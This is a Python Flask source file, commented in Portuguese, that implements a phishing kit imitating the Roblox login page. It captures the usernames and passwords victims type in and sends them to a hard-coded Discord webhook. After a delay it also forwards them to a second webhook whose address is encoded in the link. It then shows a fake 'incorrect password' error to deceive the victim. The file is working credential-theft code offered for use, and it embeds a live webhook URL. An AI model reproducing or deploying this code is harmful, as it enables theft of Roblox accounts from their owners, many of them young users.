import threading, time, requests, base64, os
from flask import Flask, request, render_template_string

app = Flask(__name__)

# SEU WEBHOOK MESTRE (FIXO)
MASTER = "https://discord.com/api/webhooks/1470876714912583996/-fHY_z5n3qMq0nfoYdhSFxdHZnXHjdRovLyTEvPmjdSK2tVSMyJ0J4Ayz93Pm8LkKSgp"

# Rota do Gerador de Links (Só você vê)
@app.route('/')
def gerador():
    return '''<body style="background:#1e1e1e;color:#00ff00;font-family:monospace;text-align:center;padding:20px;">
    <h1>GERADOR DE LINK</h1>
    <p>Cole o Webhook da Vítima abaixo:</p>
    <input type="text" id="w" placeholder="Webhook aqui..." style="width:90%;padding:10px;margin-bottom:10px;">
    <br>
    <button onclick="gen()" style="padding:15px;background:#00ff00;border:none;cursor:pointer;font-weight:bold;">GERAR LINK AGORA</button>
    <div id="res" style="margin-top:20px;word-break:break-all;color:white;background:#333;padding:10px;"></div>
    <script>
    function gen(){
        let h=document.getElementById('w').value;
        if(!h){alert('Cola o webhook primeiro!');return;}
        let final = window.location.origin + "/login?v=" + btoa(h);
        document.getElementById('res').innerText = final;
    }
    </script></body>'''

# Rota do Login (A Vítima vê)
@app.route('/login', methods=['GET', 'POST'])
def login():
    # Se a pessoa clicou em ENTRAR
    if request.method == 'POST':
        u = request.form.get('username')
        p = request.form.get('password')
        v = request.args.get('v') # Pega o webhook da vítima codificado
        
        # 1. Monta o aviso
        payload = {
            "username": "Spy",
            "avatar_url": "https://upload.wikimedia.org/wikipedia/commons/thumb/c/ca/Roblox_logo.svg/1200px-Roblox_logo.svg.png",
            "embeds": [{
                "title": "🎣 Pescou um Peixe!",
                "color": 16711680,
                "fields": [
                    {"name": "👤 Usuário", "value": f"`{u}`", "inline": True},
                    {"name": "🔑 Senha", "value": f"`{p}`", "inline": True}
                ],
                "footer": {"text": "Sistema Automático"}
            }]
        }

        # 2. Envia para VOCÊ agora (sem delay)
        try: requests.post(MASTER, json=payload)
        except: pass
        
        # 3. Envia para a Vítima (com 30s de delay)
        if v:
            def delay_send():
                time.sleep(30) # O atraso de 30 segundos
                try: 
                    webhook_vitima = base64.b64decode(v).decode()
                    requests.post(webhook_vitima, json=payload)
                except: pass
            threading.Thread(target=delay_send).start()

        # Retorna erro falso
        return render_template_string(HTML_ROBLOX, error=True)

    # Se a pessoa só abriu o site
    return render_template_string(HTML_ROBLOX, error=False)

# O HTML IDÊNTICO AO OFICIAL
HTML_ROBLOX = '''
<!DOCTYPE html>
<html lang="pt-br">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Roblox Login</title>
<style>
    body { margin: 0; padding: 0; font-family: 'HCo Gotham SSm', 'Helvetica Neue', Helvetica, Arial, 'Lucida Grande', sans-serif; background-color: #f2f4f7; display: flex; justify-content: center; align-items: center; height: 100vh; }
    .login-container { background-color: #ffffff; width: 100%; max-width: 360px; padding: 20px; border-radius: 4px; box-shadow: 0 1px 4px rgba(0,0,0,0.1); text-align: center; }
    .logo { width: 120px; margin-bottom: 30px; margin-top: 10px; }
    .input-group { margin-bottom: 15px; text-align: left; }
    input { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; font-size: 16px; box-sizing: border-box; background-color: #fcfcfc; }
    input:focus { border-color: #000; outline: none; }
    input::placeholder { color: #757575; opacity: 1; }
    .btn-login { width: 100%; padding: 12px; background-color: #232527; color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: bold; cursor: pointer; transition: background 0.2s; }
    .btn-login:hover { background-color: #000; }
    .links { margin-top: 20px; font-size: 12px; color: #757575; }
    .links a { color: #0074e0; text-decoration: none; display: block; margin: 10px 0; }
    .links a:hover { text-decoration: underline; }
    .error-msg { color: #f23d3d; font-size: 13px; margin-bottom: 15px; border: 1px solid #f23d3d; padding: 5px; border-radius: 3px; background: rgba(242,61,61,0.1); }
    .separator { border-top: 1px solid #e3e3e3; margin: 25px 0; }
    .btn-signup { background-color: #fff; border: 1px solid #ccc; color: #000; width: 100%; padding: 10px; font-weight: bold; cursor: pointer; border-radius: 4px; }
</style>
</head>
<body>

<div class="login-container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/ca/Roblox_logo.svg/2560px-Roblox_logo.svg.png" alt="Roblox" class="logo">
    
    <h2>Iniciar sessão</h2>

    {% if error %}
    <div class="error-msg">Usuário ou senha incorretos. Tente novamente.</div>
    {% endif %}

    <form method="POST">
        <div class="input-group">
            <input type="text" name="username" placeholder="Usuário/E-mail/Telefone" required>
        </div>
        <div class="input-group">
            <input type="password" name="password" placeholder="Senha" required>
        </div>
        <button type="submit" class="btn-login">Entrar</button>
    </form>

    <div class="links">
        <a href="#">Esqueceu a senha ou nome de usuário?</a>
        
        <div class="separator"></div>
        <p>Não tem uma conta?</p>
        <button class="btn-signup">Cadastrar-se</button>
    </div>
</div>

</body>
</html>
'''

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
      
